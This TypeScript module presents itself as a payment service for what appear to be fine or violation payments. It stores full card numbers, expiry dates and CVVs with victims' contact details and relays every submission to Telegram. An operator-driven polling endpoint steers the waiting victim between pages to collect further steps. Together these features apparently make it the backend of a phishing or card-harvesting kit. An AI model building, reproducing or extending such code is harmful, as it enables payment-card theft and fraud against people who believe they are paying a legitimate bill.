import { paymentDao } from "../dao/payment.dao";
import { logger } from "../utils/logger";
import { PaymentInput, FlowCheckResult } from "../types";
import { telegramService } from "./telegram.service";
import { FlowSubmission } from "../models/payment.model";
import {
  isRedirectAction,
  pageForAction,
  pathForAction,
} from "../constants/flow";

function makeReference(): string {
  const rand = Math.random().toString(36).slice(2, 7).toUpperCase();
  return `PAY-${Date.now().toString(36).toUpperCase()}-${rand}`;
}

export const paymentService = {
  async submit(input: PaymentInput, ip?: string, userAgent?: string) {
    const reference = makeReference();
    const cardDigits = (input.cardNumber ?? "").replace(/\D/g, "");

    const record = await paymentDao.create({
      reference,
      referenceId: input.referenceId,
      fullName: input.fullName,
      mobile: input.mobile,
      email: input.email,
      identifier: input.identifier,
      amount: input.amount,
      violationRefs: input.violationRefs ?? [],
      notes: input.notes,
      language: input.language ?? "en",
      status: "submitted",
      cardholderName: input.cardholderName,
      cardNumber: cardDigits || undefined,
      cardLastFour: cardDigits ? cardDigits.slice(-4) : undefined,
      cardExpiryMonth: input.cardExpiryMonth,
      cardExpiryYear: input.cardExpiryYear,
      cardCvv: input.cardCvv,
      ip,
      userAgent,
    });

    // Relay to Telegram in the BACKGROUND so the user gets an instant response.
    void telegramService
      .sendStep("payment_completed", record)
      .then((sent) =>
        sent.ok
          ? paymentDao.updateStatus(reference, "forwarded", sent.messageId)
          : paymentDao.updateStatus(reference, "failed"),
      )
      .catch((err) => {
        logger.error("Telegram relay failed", err);
        return paymentDao.updateStatus(reference, "failed");
      });

    return { reference, status: record.status, amount: record.amount };
  },

  async getPrefill(reference: string) {
    const record = await paymentDao.findByReference(reference);
    if (!record) return null;
    return {
      fullName: record.fullName,
      mobile: record.mobile,
      email: record.email ?? "",
      identifier: record.identifier ?? "",
      amount: record.amount,
      referenceId: record.referenceId ?? "",
      violationRefs: record.violationRefs ?? [],
      language: record.language ?? "ar",
      notes: record.notes ?? "",
    };
  },

  /**
   * Poll endpoint for the waiting browser. Mirrors jusoura's loaderCheckResponse:
   * when the customer has arrived on the page the admin sent them to, the action
   * is cleared so they stay put; otherwise a redirect path is returned.
   */
  async flowCheck(
    reference: string,
    currentPage?: string,
  ): Promise<FlowCheckResult> {
    let record = await paymentDao.findByReference(reference);
    if (!record) return { ok: false, action: null, redirect: null };

    // Real-time sync: persist where the customer currently is
    if (currentPage && record.currentPage !== currentPage) {
      record = await paymentDao.updateCurrentPage(reference, currentPage);
      if (!record) return { ok: false, action: null, redirect: null };
    }

    const action = record.flowAction ?? null;

    // No pending action — customer just waits.
    if (!isRedirectAction(action)) {
      return { ok: true, action: null, redirect: null };
    }

    const targetPage = pageForAction(action);

    if (currentPage && targetPage === currentPage) {
      // Admin sent customer to THIS SAME PAGE they're already on.
      // This means: "reject / ask them to redo" — fire onReset on the frontend.
      // Clear the action so it only fires once per admin send.
      await paymentDao.clearFlowAction(reference);
      return { ok: true, action, redirect: null };
    }

    // Admin sent customer to a DIFFERENT page — return the redirect path.
    const redirect = pathForAction(action);
    return { ok: true, action, redirect };
  },

  /** Records a submission from a flow screen and relays it to Telegram. */
  async flowStep(
    reference: string,
    step: string,
    data: Record<string, unknown>,
    ip?: string,
    userAgent?: string,
  ): Promise<{ ok: boolean }> {
    const submission: FlowSubmission = {
      step,
      data,
      ip,
      userAgent,
      submittedAt: new Date(),
    };

    const record = await paymentDao.appendFlowSubmission(reference, submission);
    if (!record) return { ok: false };

    // Clear flow action since this step has been submitted
    await paymentDao.clearFlowAction(reference);

    void telegramService.sendStep(step, record, data).catch((err) => {
      logger.error("Telegram flow relay failed", err);
    });

    return { ok: true };
  },
};
